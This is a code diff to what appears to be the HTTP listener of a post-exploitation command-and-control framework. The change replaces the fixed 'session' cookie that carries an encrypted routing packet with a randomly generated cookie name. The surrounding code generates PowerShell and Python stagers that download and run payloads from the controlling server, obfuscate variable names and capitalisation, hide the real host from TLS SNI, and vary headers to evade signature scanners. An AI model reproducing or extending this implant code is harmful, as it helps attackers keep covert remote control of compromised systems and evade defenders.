@@ -2,6 +2,7 @@ import logging
 import base64
 import sys
 import random
+import string
 import os
 import ssl
 import time
@@ -111,6 +112,11 @@ class Listener:
                 'Required'      :   True,
                 'Value'         :   'Server:Microsoft-IIS/7.5'
             },
+            'Cookie' : {
+                'Description'   :   'Custom Cookie Name',
+                'Required'      :   False,
+                'Value'         :   ''
+            },            
             'StagerURI' : {
                 'Description'   :   'URI for the stager. Must use /download/. Example: /download/stager.php',
                 'Required'      :   False,
@@ -156,6 +162,12 @@ class Listener:
 
         # randomize the length of the default_response and index_page headers to evade signature based scans
         self.header_offset = random.randint(0, 64)
+
+        self.session_cookie = ''
+
+        # check if the current session cookie not empty and then generate random cookie
+        if self.session_cookie == '':
+            self.options['Cookie']['Value'] = self.generate_cookie()
 
     def default_response(self):
         """
@@ -269,6 +281,14 @@ class Listener:
             uris = [a for a in profile.split('|')[0].split(',')]
             stage0 = random.choice(uris)
             customHeaders = profile.split('|')[2:]
+
+            cookie = listenerOptions['Cookie']['Value']
+
+            # generate new cookie if the current session cookie is empty to avoid empty cookie if create multiple listeners
+            if cookie == '':
+                generate = self.generate_cookie()
+                listenerOptions['Cookie']['Value'] = generate
+                cookie = generate
 
             if language.startswith('po'):
                 # PowerShell
@@ -388,16 +408,14 @@ class Listener:
                         #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                         if headerKey.lower() == "host":
                             stager += helpers.randomize_capitalization("try{$ig=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser)}catch{};")
-
+ 
                         stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
                         stager += "\"%s\",\"%s\");" % (headerKey, headerValue)
 
                 # add the RC4 packet to a cookie
-
                 stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
-                stager += "\"Cookie\",\"session=%s\");" % (b64RoutingPacket)
-
-
+                stager += "\"Cookie\",\"%s=%s\");" % (cookie, b64RoutingPacket)
+                
                 stager += helpers.randomize_capitalization("$data=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser+$t);")
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
 
@@ -449,7 +467,7 @@ class Listener:
                 launcherBase += "req=urllib2.Request(server+t);\n"
                 # add the RC4 packet to a cookie
                 launcherBase += "req.add_header('User-Agent',UA);\n"
-                launcherBase += "req.add_header('Cookie',\"session=%s\");\n" % (b64RoutingPacket)
+                launcherBase += "req.add_header('Cookie',\"%s=%s\");\n" % (cookie,b64RoutingPacket)
 
                 # Add custom headers if any
                 if customHeaders != []:
@@ -553,8 +571,15 @@ class Listener:
                 host += "/"
 
             #Patch in custom Headers
+            remove = []
             if customHeaders != []:
-                headers = ','.join(customHeaders)
+                for key in customHeaders:
+                    value = key.split(":")
+                    if 'cookie' in value[0].lower() and value[1]:
+                        continue
+                    remove += value    
+                headers = ','.join(remove)
+                #headers = ','.join(customHeaders)
                 stager = stager.replace("$customHeaders = \"\";","$customHeaders = \""+headers+"\";")
 
             #patch in working hours, if any
@@ -744,7 +769,7 @@ class Listener:
 
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
                                 $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie", "session=$RoutingCookie")
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie",\"""" + self.session_cookie + """=$RoutingCookie")
 
                                 # choose a random valid URI for checkin
                                 $taskURI = $script:TaskURIs | Get-Random
@@ -836,7 +861,7 @@ def send_message(packets=None):
         #   meta TASKING_REQUEST = 4
         routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
         b64routingPacket = base64.b64encode(routingPacket)
-        headers['Cookie'] = "session=%s" % (b64routingPacket)
+        headers['Cookie'] = \"""" + self.session_cookie + """=%s" % (b64routingPacket)
 
     taskURI = random.sample(taskURIs, 1)[0]
     requestUri = server + taskURI
@@ -980,11 +1005,12 @@ def send_message(packets=None):
 
             routingPacket = None
             cookie = request.headers.get('Cookie')
+
             if cookie and cookie != '':
                 try:
                     # see if we can extract the 'routing packet' from the specified cookie location
                     # NOTE: this can be easily moved to a paramter, another cookie value, etc.
-                    if 'session' in cookie:
+                    if self.session_cookie in cookie:
                         listenerName = self.options['Name']['Value']
                         message = "[*] GET cookie value from {} : {}".format(clientIP, cookie)
                         signal = json.dumps({
@@ -994,7 +1020,7 @@ def send_message(packets=None):
                         dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
                         cookieParts = cookie.split(';')
                         for part in cookieParts:
-                            if part.startswith('session'):
+                            if part.startswith(self.session_cookie):
                                 base64RoutingPacket = part[part.find('=')+1:]
                                 # decode the routing packet base64 value in the cookie
                                 routingPacket = base64.b64decode(base64RoutingPacket)
@@ -1210,3 +1236,14 @@ def send_message(packets=None):
         else:
             print helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value']))
             self.threads[self.options['Name']['Value']].kill()
+
+
+    def generate_cookie(self):
+        """
+        Generate Cookie
+        """
+
+        chars = string.letters
+        cookie = helpers.random_string(random.randint(6,16), charset=chars)
+
+        return cookie            
